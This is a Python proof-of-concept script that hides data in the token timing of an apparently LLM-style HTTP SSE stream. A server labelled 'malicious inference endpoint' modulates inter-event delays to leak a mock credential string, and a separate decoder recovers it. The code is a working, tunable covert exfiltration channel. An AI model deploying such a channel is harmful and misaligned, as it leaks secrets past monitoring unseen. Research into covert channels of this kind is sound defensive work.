#!/usr/bin/env python3
"""TCP covert timing channel: exfiltrate data through a real HTTP SSE stream.

Proves that TCP does NOT prevent timing covert channels. The server is a
normal-looking HTTP SSE inference endpoint. The decoder receives the stream
in a SEPARATE PROCESS (avoiding GIL contention) and timestamps each
SSE event arrival.

Two decoder modes:
  1. "app" — application-level recv() timestamps (no root needed)
  2. "bpf" — BPF/AF_PACKET wire-level timestamps (root required)

Both achieve the same result: TCP_NODELAY ensures each send() produces a
distinct TCP segment, and process isolation ensures the receiver's
timestamps aren't contaminated by the sender's busy-wait loop.

Usage:
    python experiments/timing_channel/tcp_covert_channel.py demo
    python experiments/timing_channel/tcp_covert_channel.py sweep
"""
from __future__ import annotations

import argparse
import hashlib
import json
import math
import multiprocessing
import socket
import struct
import time
from dataclasses import dataclass


# ---------------------------------------------------------------------------
# Channel config + encoding (identical to UDP version)
# ---------------------------------------------------------------------------

@dataclass
class ChannelConfig:
    levels: int = 16
    base_delay_s: float = 0.020
    step_s: float = 0.0005
    calibration_symbols: int = 32
    repetitions: int = 3

    @property
    def bits_per_token(self) -> float:
        return math.log2(self.levels)

    @property
    def modulation_range_ms(self) -> float:
        return self.step_s * (self.levels - 1) * 1000

    def symbol_to_delay(self, symbol: int) -> float:
        return self.base_delay_s + self.step_s * symbol

    def delay_to_symbol(self, delay_s: float, base: float, step: float) -> int:
        if step <= 0:
            return 0
        raw = (delay_s - base) / step
        return max(0, min(self.levels - 1, round(raw)))


def bytes_to_symbols(data: bytes, bits_per_sym: int) -> list[int]:
    bits = "".join(f"{b:08b}" for b in data)
    while len(bits) % bits_per_sym:
        bits += "0"
    return [int(bits[i:i + bits_per_sym], 2) for i in range(0, len(bits), bits_per_sym)]


def symbols_to_bytes(symbols: list[int], bits_per_sym: int, nbytes: int) -> bytes:
    bits = "".join(f"{s:0{bits_per_sym}b}" for s in symbols)
    out = []
    for i in range(0, nbytes * 8, 8):
        out.append(int(bits[i:i + 8], 2) if i + 8 <= len(bits) else 0)
    return bytes(out)


def frame_message(secret: bytes, cfg: ChannelConfig) -> list[int]:
    cal = [0 if i % 2 == 0 else cfg.levels - 1 for i in range(cfg.calibration_symbols)]
    length_bytes = struct.pack(">I", len(secret))
    checksum = hashlib.sha256(secret).digest()[:4]
    payload_syms = bytes_to_symbols(length_bytes + secret + checksum, int(cfg.bits_per_token))
    return cal + payload_syms


def decode_message(symbols: list[int], cfg: ChannelConfig) -> tuple[bytes, bool]:
    bps = int(cfg.bits_per_token)
    data_syms = symbols[cfg.calibration_symbols:]
    if len(data_syms) < math.ceil(32 / bps):
        return b"", False
    len_n = math.ceil(32 / bps)
    msg_len = struct.unpack(">I", symbols_to_bytes(data_syms[:len_n], bps, 4))[0]
    if msg_len > 10000:
        return b"", False
    total = 4 + msg_len + 4
    need = math.ceil(total * 8 / bps)
    if len(data_syms) < need:
        return b"", False
    raw = symbols_to_bytes(data_syms[:need], bps, total)
    msg = raw[4:4 + msg_len]
    got_ck = raw[4 + msg_len:4 + msg_len + 4]
    want_ck = hashlib.sha256(msg).digest()[:4]
    return msg, got_ck == want_ck


# ---------------------------------------------------------------------------
# TCP SSE Server (the malicious inference endpoint)
# ---------------------------------------------------------------------------

WORDS = (
    "the model generates tokens sequentially based on attention patterns and "
    "learned representations from training data which enables coherent text "
    "generation across many different domains including tasks like summarization"
).split()


def _run_server(port: int, secret: bytes, cfg_dict: dict):
    """Server process: HTTP SSE with covert timing."""
    cfg = ChannelConfig(**cfg_dict)
    symbols = frame_message(secret, cfg)
    bps = int(cfg.bits_per_token)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", port))
    srv.listen(1)

    conn, _ = srv.accept()
    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    # Read HTTP request
    buf = b""
    while b"\r\n\r\n" not in buf:
        buf += conn.recv(4096)

    # Send HTTP SSE headers as one chunk
    headers = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/event-stream\r\n"
        "Cache-Control: no-cache\r\n"
        "Connection: keep-alive\r\n"
        "X-Model: llama-7b-chat\r\n"
        "\r\n"
    )
    conn.sendall(headers.encode())
    time.sleep(0.05)  # separate header segment from data

    for rep in range(cfg.repetitions):
        for i, symbol in enumerate(symbols):
            idx = rep * len(symbols) + i
            token = WORDS[idx % len(WORDS)]
            obj = {"t": token, "i": idx, "lp": round(-0.5 - symbol * 0.01, 3)}
            event = f"data: {json.dumps(obj, separators=(',', ':'))}\n\n"

            # === COVERT CHANNEL: modulate delay ===
            delay = cfg.symbol_to_delay(symbol)
            deadline = time.perf_counter() + delay
            while time.perf_counter() < deadline:
                pass

            try:
                conn.sendall(event.encode())
            except (BrokenPipeError, ConnectionResetError):
                srv.close()
                return

    try:
        conn.sendall(b'data: {"done":true}\n\n')
    except (BrokenPipeError, ConnectionResetError):
        pass

    time.sleep(0.1)
    conn.close()
    srv.close()


def _run_client(port: int, cfg_dict: dict, result_queue: multiprocessing.Queue):
    """Client/decoder process: timestamps each SSE event via recv()."""
    cfg = ChannelConfig(**cfg_dict)
    time.sleep(0.1)  # let server start

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(60.0)
    sock.connect(("127.0.0.1", port))

    request = (
        f"GET /v1/completions HTTP/1.1\r\n"
        f"Host: 127.0.0.1:{port}\r\n"
        f"Accept: text/event-stream\r\n"
        f"\r\n"
    )
    sock.sendall(request.encode())

    # Strategy: recv() small chunks. Each recv() that returns data gets a
    # timestamp. Parse SSE events from the accumulated buffer. When a new
    # event completes, assign it the timestamp of the recv() that delivered
    # its final byte.
    #
    # With TCP_NODELAY on both sides and process isolation, each server
    # send() generally arrives as a separate recv() with a distinct timestamp.
    timestamps: list[float] = []
    buf = b""
    header_done = False

    while True:
        try:
            # Small buffer to reduce batching
            chunk = sock.recv(256)
        except socket.timeout:
            break
        if not chunk:
            break

        t = time.perf_counter()
        buf += chunk

        if not header_done:
            if b"\r\n\r\n" in buf:
                _, buf = buf.split(b"\r\n\r\n", 1)
                header_done = True
            continue

        # Parse complete SSE events
        while b"\n\n" in buf:
            event_data, buf = buf.split(b"\n\n", 1)
            line = event_data.decode("utf-8", errors="replace").strip()
            if line.startswith("data: "):
                payload = line[6:]
                try:
                    obj = json.loads(payload)
                except json.JSONDecodeError:
                    continue
                if obj.get("done"):
                    sock.close()
                    result_queue.put(timestamps)
                    return
                timestamps.append(t)

    sock.close()
    result_queue.put(timestamps)


# ---------------------------------------------------------------------------
# Decoder (same analysis as UDP version)
# ---------------------------------------------------------------------------

def analyze_timestamps(timestamps: list[float], cfg: ChannelConfig) -> dict:
    if len(timestamps) < 2:
        return {"error": "too few events", "count": len(timestamps)}

    delays = [timestamps[i] - timestamps[i - 1] for i in range(1, len(timestamps))]
    cal_n = cfg.calibration_symbols
    bps = int(cfg.bits_per_token)

    if len(delays) < cal_n:
        return {"error": f"insufficient events ({len(delays)} < {cal_n})"}

    low_delays = [delays[k] for k in range(cal_n) if k % 2 == 1]
    high_delays = [delays[k] for k in range(cal_n) if k % 2 == 0]

    base = _median(low_delays)
    top = _median(high_delays)
    step = (top - base) / max(1, cfg.levels - 1)

    low_jit = _stddev(low_delays) * 1e6
    high_jit = _stddev(high_delays) * 1e6

    # Outlier merging
    cleaned = []
    carry = 0.0
    for d in delays:
        d += carry
        carry = 0.0
        if d < base * 0.3:
            carry = d
            cleaned.append(None)
        else:
            cleaned.append(d)

    all_syms = [0]
    for d in cleaned:
        if d is None:
            all_syms.append(0)
        else:
            all_syms.append(cfg.delay_to_symbol(d, base=base, step=step))

    cal_expected = [0 if i % 2 == 0 else cfg.levels - 1 for i in range(cal_n)]
    cal_errors = sum(1 for a, b in zip(cal_expected, all_syms[:cal_n]) if a != b)

    syms_per_rep = len(all_syms) // cfg.repetitions
    single_msg, single_ok = decode_message(all_syms[:syms_per_rep], cfg)

    if cfg.repetitions > 1 and syms_per_rep > 0:
        reps = [all_syms[r * syms_per_rep:(r + 1) * syms_per_rep]
                for r in range(cfg.repetitions)]
        voted = []
        for pos in range(syms_per_rep):
            cands = [reps[r][pos] for r in range(len(reps)) if pos < len(reps[r])]
            voted.append(max(set(cands), key=cands.count))
        voted_msg, voted_ok = decode_message(voted, cfg)
    else:
        voted_msg, voted_ok = single_msg, single_ok

    wall = timestamps[-1] - timestamps[0]
    payload_delays = delays[cal_n:]
    total_bits = len(payload_delays) * bps

    return {
        "events_received": len(timestamps),
        "wall_time_s": round(wall, 3),
        "calibration": {
            "measured_base_ms": round(base * 1000, 4),
            "measured_top_ms": round(top * 1000, 4),
            "measured_step_us": round(step * 1e6, 2),
            "low_jitter_us": round(low_jit, 2),
            "high_jitter_us": round(high_jit, 2),
            "errors": cal_errors,
            "error_rate": round(cal_errors / cal_n, 4),
        },
        "decoding": {
            "single_ok": single_ok,
            "single_msg": single_msg.decode("utf-8", errors="replace") if single_msg else "",
            "voted_ok": voted_ok,
            "voted_msg": voted_msg.decode("utf-8", errors="replace") if voted_msg else "",
        },
        "channel": {
            "bits_per_token": bps,
            "total_covert_bits": total_bits,
            "bitrate_bps": round(total_bits / wall, 1) if wall > 0 else 0,
            "tok_per_sec": round(len(timestamps) / wall, 1) if wall > 0 else 0,
        },
        "delay_stats": {
            "mean_ms": round(_mean(payload_delays) * 1000, 4) if payload_delays else 0,
            "stddev_us": round(_stddev(payload_delays) * 1e6, 2) if payload_delays else 0,
            "min_ms": round(min(payload_delays) * 1000, 4) if payload_delays else 0,
            "max_ms": round(max(payload_delays) * 1000, 4) if payload_delays else 0,
        },
    }


# ---------------------------------------------------------------------------
# Demo runner
# ---------------------------------------------------------------------------

def run_tcp_demo(secret: str, cfg: ChannelConfig, port: int = 9100) -> dict:
    secret_bytes = secret.encode("utf-8")
    symbols = frame_message(secret_bytes, cfg)
    bps = int(cfg.bits_per_token)
    nsyms = len(symbols)
    ntokens = nsyms * cfg.repetitions
    covert_bits = nsyms * bps
    avg_d = cfg.base_delay_s + cfg.step_s * (cfg.levels - 1) / 2
    est = ntokens * avg_d

    print("=" * 70)
    print("TCP COVERT TIMING CHANNEL (HTTP SSE)")
    print("=" * 70)
    print(f"  Secret:       \"{secret}\" ({len(secret_bytes)} bytes)")
    print(f"  Encoding:     {cfg.levels}-PAM ({bps} bits/token)")
    print(f"  Base delay:   {cfg.base_delay_s*1000:.2f}ms  Step: {cfg.step_s*1e6:.0f}µs  "
          f"Range: {cfg.modulation_range_ms:.2f}ms")
    print(f"  Symbols/rep:  {nsyms}  ({cfg.calibration_symbols} cal + "
          f"{nsyms - cfg.calibration_symbols} data)")
    print(f"  Reps:         {cfg.repetitions}  Total tokens: {ntokens}")
    print(f"  Payload:      {covert_bits} bits = {covert_bits // 8} bytes/rep")
    print(f"  Est time:     {est:.1f}s  Theoretical: {covert_bits / est:.0f} bps")
    print(f"  Transport:    TCP + HTTP SSE (port {port})")
    print()

    cfg_dict = {
        "levels": cfg.levels, "base_delay_s": cfg.base_delay_s,
        "step_s": cfg.step_s, "calibration_symbols": cfg.calibration_symbols,
        "repetitions": cfg.repetitions,
    }

    ctx = multiprocessing.get_context("fork")
    result_queue = ctx.Queue()

    server = ctx.Process(target=_run_server, args=(port, secret_bytes, cfg_dict), daemon=True)
    server.start()

    client = ctx.Process(target=_run_client, args=(port, cfg_dict, result_queue), daemon=True)
    client.start()

    print("  Streaming...", end="", flush=True)
    client.join(timeout=est + 30)
    server.join(timeout=5)
    print(" done.\n")

    try:
        timestamps = result_queue.get(timeout=2)
    except Exception:
        timestamps = []

    if not timestamps or len(timestamps) < 2:
        print(f"  ERROR: only {len(timestamps)} events received")
        return {"error": "insufficient events"}

    result = analyze_timestamps(timestamps, cfg)

    cal = result.get("calibration", {})
    ch = result.get("channel", {})
    ds = result.get("delay_stats", {})
    dec = result.get("decoding", {})

    print(f"  Events:       {result.get('events_received', 0)}  Wall: {result.get('wall_time_s', 0)}s")
    print(f"  Calibration:  base={cal.get('measured_base_ms', 0):.4f}ms  "
          f"top={cal.get('measured_top_ms', 0):.4f}ms  "
          f"step={cal.get('measured_step_us', 0):.2f}µs")
    print(f"  Jitter:       {cal.get('low_jitter_us', 0):.1f}µs / "
          f"{cal.get('high_jitter_us', 0):.1f}µs (low/high)")
    print(f"  Cal errors:   {cal.get('errors', 0)}/{cfg.calibration_symbols} "
          f"({cal.get('error_rate', 0)*100:.1f}%)")
    print(f"  Delay range:  [{ds.get('min_ms', 0):.4f}, {ds.get('max_ms', 0):.4f}]ms  "
          f"σ={ds.get('stddev_us', 0):.1f}µs")
    print()
    print(f"  Bitrate:      {ch.get('bitrate_bps', 0):.0f} bits/sec  "
          f"({ch.get('tok_per_sec', 0):.0f} tok/s × {bps} bits)")
    print()
    print(f"  Single-rep:   {'PASS' if dec.get('single_ok') else 'FAIL'}")
    if cfg.repetitions > 1:
        print(f"  Majority vote:{'PASS' if dec.get('voted_ok') else 'FAIL'}")
    decoded = dec.get("voted_msg", "") or dec.get("single_msg", "")
    if decoded:
        print(f"  Decoded:      \"{decoded}\"")
    print()

    if decoded == secret:
        print("  >>> SECRET EXFILTRATED OVER TCP <<<")
    elif dec.get("single_ok") or dec.get("voted_ok"):
        print("  >>> PARTIAL (checksum ok, content differs) <<<")
    else:
        print("  >>> DECODE FAILED <<<")
    print()
    return result


# ---------------------------------------------------------------------------
# Presets
# ---------------------------------------------------------------------------

PRESETS = {
    "conservative": ChannelConfig(
        levels=2, base_delay_s=0.015, step_s=0.010,
        calibration_symbols=32, repetitions=3,
    ),
    "moderate": ChannelConfig(
        levels=4, base_delay_s=0.010, step_s=0.005,
        calibration_symbols=48, repetitions=5,
    ),
    "aggressive": ChannelConfig(
        levels=8, base_delay_s=0.008, step_s=0.003,
        calibration_symbols=64, repetitions=7,
    ),
    "maximum": ChannelConfig(
        levels=16, base_delay_s=0.005, step_s=0.002,
        calibration_symbols=64, repetitions=9,
    ),
}


def _mean(xs: list[float]) -> float:
    return sum(xs) / len(xs) if xs else 0.0

def _median(xs: list[float]) -> float:
    if not xs:
        return 0.0
    s = sorted(xs)
    n = len(s)
    return s[n // 2] if n % 2 else (s[n // 2 - 1] + s[n // 2]) / 2

def _stddev(xs: list[float]) -> float:
    if len(xs) < 2:
        return 0.0
    m = _mean(xs)
    return (sum((x - m) ** 2 for x in xs) / (len(xs) - 1)) ** 0.5


def main():
    p = argparse.ArgumentParser(description="TCP covert timing channel demo")
    sub = p.add_subparsers(dest="mode")

    d = sub.add_parser("demo")
    d.add_argument("--secret", default="EXFIL: db_pass=hunter2 api_key=sk-abc123")
    d.add_argument("--port", type=int, default=9100)
    d.add_argument("--preset", choices=list(PRESETS.keys()), default="moderate")

    s = sub.add_parser("sweep")
    s.add_argument("--secret", default="EXFIL: db_pass=hunter2 api_key=sk-abc123")
    s.add_argument("--port", type=int, default=9100)

    args = p.parse_args()

    if args.mode == "demo":
        run_tcp_demo(args.secret, PRESETS[args.preset], args.port)
    elif args.mode == "sweep":
        results = {}
        for i, (name, cfg) in enumerate(PRESETS.items()):
            print(f"\n{'#' * 70}")
            print(f"# {name.upper()}")
            print(f"{'#' * 70}\n")
            result = run_tcp_demo(args.secret, cfg, args.port + i)
            results[name] = result
            time.sleep(0.5)

        print("\n" + "=" * 70)
        print("TCP COVERT CHANNEL SUMMARY")
        print("=" * 70)
        print(f"\n{'Preset':<14} {'Lvl':>4} {'b/tok':>5} {'Step':>8} "
              f"{'bps':>7} {'Jitter':>10} {'CalErr':>7} {'OK?':>5}")
        print("-" * 65)
        for name, r in results.items():
            c = PRESETS[name]
            ch = r.get("channel", {})
            cal = r.get("calibration", {})
            dec = r.get("decoding", {})
            ok = "YES" if (dec.get("voted_ok") or dec.get("single_ok")) else "NO"
            jit = f"{cal.get('low_jitter_us', 0):.0f}µs"
            print(f"{name:<14} {c.levels:>4} {int(c.bits_per_token):>5} "
                  f"{c.step_s*1e6:>6.0f}µs "
                  f"{ch.get('bitrate_bps', 0):>7.0f} "
                  f"{jit:>10} "
                  f"{cal.get('error_rate', 0)*100:>6.1f}% "
                  f"{ok:>5}")
        print(f"\nSecret: \"{args.secret}\" ({len(args.secret)} bytes)")
        print("Transport: TCP/HTTP SSE (standard streaming inference)")
    else:
        p.print_help()


if __name__ == "__main__":
    main()
